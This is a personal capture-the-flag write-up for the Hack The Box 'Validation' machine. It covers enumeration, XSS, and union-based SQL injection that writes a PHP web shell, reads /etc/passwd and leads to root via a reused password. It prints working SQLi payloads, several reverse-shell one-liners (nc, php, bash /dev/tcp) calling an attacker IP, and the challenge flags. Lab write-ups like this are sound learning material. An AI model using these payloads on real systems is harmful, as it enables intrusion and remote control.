# Enumeration
## nmap
`nmap -sV -A -v -p- 10.10.11.116`:
![[Screenshot 2022-05-09 at 14.52.42.png]]
--> _filemaker_ is a server
--> _wsm_ stands for _watchguard system manager_
The _nginx_ forbidden http server on port _4566_ has me intrigued.
![[Screenshot 2022-05-09 at 14.51.56.png]]
## curl
`curl -X OPTIONS http://10.10.11.116/ -i`
![[Screenshot 2022-05-09 at 14.53.55.png]].
This comment `<!------ Include the above in your HEAD tag ---------->` grabbed my attention.
![[Screenshot 2022-05-09 at 15.10.14.png]]
When joining, it shows the usernames of other users in the same country as you.

## gobuster
`gobuster dir -u http://10.10.11.116/ -x php,txt,html,bak,zip -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error`
![[Screenshot 2022-05-09 at 15.18.51.png]] --> nothing very interesting..

Creating the same user 2x, resulted in what seemed to be the pervious one simply overwritten. When I created admin 2x in a row for Brazil, it said _Welcome admin.. Other users: admin_. Admin was only written once.. 

Trying an SSTI, it does not work, as it appears the server reads the parameters as plaintext --> **EXCEPT** for when I use the _'_! --> Then it returns empty so surely the vulnerablility must be there?
![[Screenshot 2022-05-09 at 15.35.40.png]]
Trying the username _admin_ with the given user cookie and _'_ in country field I get this error message:
![[Screenshot 2022-05-09 at 15.37.29.png]]
--> _fetch_assoc()_

# Foothold
After reading aorund and trying to figure out where I could induce an attack or exploit - location of vulnerability - I came accros [an article](https://cwe.mitre.org/data/definitions/565.html) which mentioned _Cookies without validation and Integrity checking_. So I began to dig deeper.

!https://community.claris.com/en/s/question/0D50H00006ezKnNSAU/filemaker-server-1503-with-apache-2423-multiple-vulnerabilities 

**http-server-header apache/2.4.48 exploit**

The fact that the cookie is _Cookie_ and not _Set-Cookie_ means the server is using already stored cookies.

## document.cookie
Looks like the username is vulnerable to XSS, as when I tried inserting `<script>alert(document.cookie)</script>` in the username field, it popped up to me.
Next = figure out how to get the cookie of the admin.. --> COOKIE GRABBER
### Cookie Grabber
By trying the script `<script>document.cookie(user=admin); alert(document.cookie)</script>` in the _Username_ field, I was alerted with _user=admin_. This showed that I can manipulate the session cookie. The wuestion is just to what?
1. create a script which is stored on the account.php page


Trying to insert a pure <?php ?> script resulted in it being stored as a comment, rather than plain text..
![[Screenshot 2022-05-10 at 16.01.24.png]]

# SQLi - in Country field
XSS also possible in Country field (using Burp) but returns the error.

The SQL on the server most likely looks something along the lines of `SELECT username FROM players WHERE country = '[input]'`. So this can be exploited by selecting a country and adding `' union select <smtg>;-- -` where the _-- -_ indicates user provided text, meaning the space between the dashes signifies that it is a VALID comment. Submitting the request withtout the dashes simply returns an error.

The `union` statement simply allows for another statement to be added --> [meaning](https://www.w3schools.com/sql/sql_union.asp).


# Exploit
## enumerating
A handy [cheat sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/) which shows commands you can run once you have found the entry point for SQLi union attack.
1. Trying to figure out how many columns there are I use the command `ORDER BY 1;-- -` and increment till an error message is returned from the server. _This does not take long as it appears there is merely 1 column._
2. By trying a `UNION SELECT 1;-- -` _for the number of columns_ a 1 is returned on the page --> which is the result of the SELECT query in the backend
3. Now we can get the names of the user and database by submitting the commands `UNION SELECT user();-- -` and `UNION SELECT database();-- -`. The results:
username = _uhc@localhost_
![[Screenshot 2022-05-10 at 16.18.23.png]]
--> this is also the _session_user()_ (`union select session_user();-- -`) and _current_user()_ (`union select current_user();-- -`)
database = _registration_
![[Screenshot 2022-05-10 at 16.18.58.png]]
4. Finding out which database version is being used by executing the command `union select version();-- -` we get _10.5.11-MariaDB-1_
## rce
For rce or uploading reverse shells, it is important to know what directory the user is currently in. Considering it is an Apache server and that the error message displays _/var/www/html/account.php_ I am going to assume we are in this or the _/var/www_ directory. Following [this tutorial](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/) I proceed to try the cmd script `' union select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php';-- -` which when redirecting to `http://10.10.11.116/cmd.php?cmd=whoami` showed the following:
![[Screenshot 2022-05-11 at 17.09.12.png]] meaning we got RCE.

Trying to read a file using the _load_file()_ funciton I entered `' union select load_file('/etc/passwd');-- -` and we got the contents:
![[Screenshot 2022-05-11 at 15.44.43.png]]

With both of these now, I am going to try to upload a php reverse shell.

- `uname -a`: ![[Screenshot 2022-05-11 at 17.15.37.png]]
- `id`: ![[Screenshot 2022-05-11 at 17.17.46.png]]
- `ls`: ![[Screenshot 2022-05-11 at 17.21.17.png]]
trying `cat config.php` resulted in nothing... Until I tried using _curl_ `curl http://10.10.11.116/test.php?cmd=cat%20config.php`:
![[Screenshot 2022-05-11 at 17.36.21.png]] --> this indicated to me that all the commands work, its just only visible in the source code..
However, doing `cat /home/htb/user.txt` gave me the user flag.


# Privesc
## 1 = reverse shell
Simply trying `nc 10.10.14.19 4444 -e /bin/bash` after `cmd=` in the URL did not work.. It appears there is some form of restriction as to which commands can be executed, as only a few worked for me. `php -r '$sock=fsockopen("10.10.14.19",1234);exec("/bin/sh -i <&3 >&3 2>&3");'` also did not work..

Trying the simple bash `bash -c 'bash -i >& /dev/tcp/10.10.14.19/1234 0>&1'` instead and executing it using `curl http://10.10.11.116/c.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.19%2F1234%200%3E%261%27%0A` worked:
![[Screenshot 2022-05-11 at 17.42.17.png]]

## 2 = looking around
Whilst trying to upload linpeas.sh, I came accross the file _clean_ in _/tmp_ which seemed to contain loads of integer strings.

It appears there are loads of _capabilites_:
![[Screenshot 2022-05-11 at 17.54.05.png]]
Looking up _linux capabilities privesc_:
![[Screenshot 2022-05-11 at 17.54.36.png]]

I also found this _entrypoint.sh_ process which seems too easy?
![[Screenshot 2022-05-11 at 17.57.45.png]]
SGID's
![[Screenshot 2022-05-11 at 17.59.53.png]]

### [capabilities](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/) - CAP_CHOWN
trying `getcap -r / 2>/dev/null` following [this walkthrough](https://attackdefense.com/challengedetailsnoauth?cid=1365) did not work.
_CAP_CHOWN_ means its possible to change the ownership of any file. We dont have python (which seems to be what most of the 'walkthroughs' use) nor ruby, which we can use as suggested by [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_chown)


## Global Password
![[Screenshot 2022-05-11 at 18.13.45.png]] showed a global password, so after fiddling with CAP_CHOWN for a while, I came accross how you could simply try to use this and change user to root:
![[Screenshot 2022-05-11 at 18.13.13.png]] which worked. And we could read the flag `cat /root/root.txt` easily!





# Flags
a52501cfcc7f1d32ccd5808c65d082c4
b2d307c668285670f0a7ebc494909270
# Thoughts
- user 'id' burp sniper attack
- find the country in which the admin belongs + overwrite their access?
- 
# New Things Learnt
- second order SQLi means the webpage isnt vulnerable itself, but the server-side SQL is
- [union SQLi attack](https://portswigger.net/web-security/sql-injection/union-attacks)
- error messagesis usually a good entry point for injections
- use `hashid <hash>` to ID the type of hash!
- `user()` gets user of database, `database()` gets database name
- [linux capabilities](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/)

Helpful writeups:
- [0xdf](https://0xdf.gitlab.io/2021/09/14/htb-validation.html)
- [medium](https://medium.com/@v1per/validation-hackthebox-writeup-c71a8d76612d)
- [ryzhak](https://www.ryzhak.com/htb-validation-writeup/)
- [pencer.io one which is super detailed!](https://pencer.io/ctf/ctf-htb-validation/)